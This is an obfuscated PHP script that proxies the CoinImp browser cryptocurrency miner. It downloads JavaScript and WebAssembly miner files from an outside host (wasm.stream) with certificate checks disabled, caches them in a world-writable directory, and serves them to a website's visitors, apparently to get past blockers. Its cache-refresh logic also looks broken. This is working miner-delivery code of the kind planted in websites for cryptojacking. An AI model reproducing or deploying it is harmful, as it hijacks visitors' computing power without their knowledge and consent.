<?php $f0 = 'http://www.wasm.stream/';
$b1 = '1 hour';
$g2 = 'coinimp-cache';
function url_get_contents($m3)
{
    $i4 = false;
    if (function_exists('curl_exec')) {
        if ($h5 = curl_init($m3)) {
            curl_setopt($h5, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($h5, CURLOPT_FRESH_CONNECT, true);
            curl_setopt($h5, CURLOPT_RETURNTRANSFER, 1);
            $i4 = (curl_exec($h5));
            curl_close($h5);
        }
    } elseif (function_exists('file_get_contents')) {
        $i4 = file_get_contents($m3);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        if ($i6 = fopen($m3, "r")) {
            $i4 = stream_get_contents($i6);
        }
    }
    if ($i4) return $i4; else die("Cannot download \"$m3\"!");
}

function get_file_from_server($m7)
{
    global $f0;
    $m7 = urlencode($m7);
    $r8 = strtok($_SERVER['REQUEST_URI'], '?');
    $i9 = urlencode((isset($_SERVER['HTTPS']) ? 'https' : 'http') . "://" . $_SERVER['HTTP_HOST'] . "$r8");
    return url_get_contents("$f0?filename=$m7&host=$i9");
}

function filename_match($m7)
{
    return preg_match('/^\w{4}\.js$/', $m7) || preg_match('/^\w{6}\.js$/', $m7) || preg_match('/^\w{7}\.min\.js\.mem$/', $m7) || preg_match('/^\w{8}\.wasm$/', $m7) || preg_match('/^\w{8}\.png$/', $m7);
}

function get_cache_dir()
{
    $b10 = array('coinimp-cache', 'tmp/coinimp-cache', '/tmp/coinimp-cache');
    foreach ($b10 as $i11) {
        if (!file_exists($i11)) mkdir($i11, 0777, true);
        if (is_writeable($i11)) return $i11;
    }
    die('Cache directory "coinimp-cache" is not writeable!');
}

function get_dir_size($h12)
{
    $c13 = 0;
    $i11 = scandir($h12);
    foreach ($i11 as $y14) {
        if (($y14 !== '.') && ($y14 !== '..')) if (is_dir($h12 . '/' . $y14)) $c13 += get_dir_size($h12 . '/' . $y14); else $c13 += filesize($h12 . '/' . $y14);
    }
    return $c13;
}

$g2 = get_cache_dir();
$g15 = isset($_GET['f']) ? $_GET['f'] : '';
if (!filename_match($g15)) {
    die('Invalid argument');
}
$j16 = "$g2/$g15";
if (!file_exists($j16) || (filemtime($j16) < strtotime("-$b1"))) {
    $v17 = get_file_from_server($g15);
    file_put_contents($j16, $v17);
} elseif (get_dir_size($g2) < 7000000) {
    rmdir($g2);
    $v17 = get_file_from_server($g15);
    file_put_contents($j16, $v17);
} else {
    $v17 = file_get_contents($j16);
}
$q18 = substr($g15, -2) == 'js' ? 'application/javascript' : 'application/octet-stream';
header('Content-Type: ' . $q18 . '; charset=utf-8');
die($v17); ?>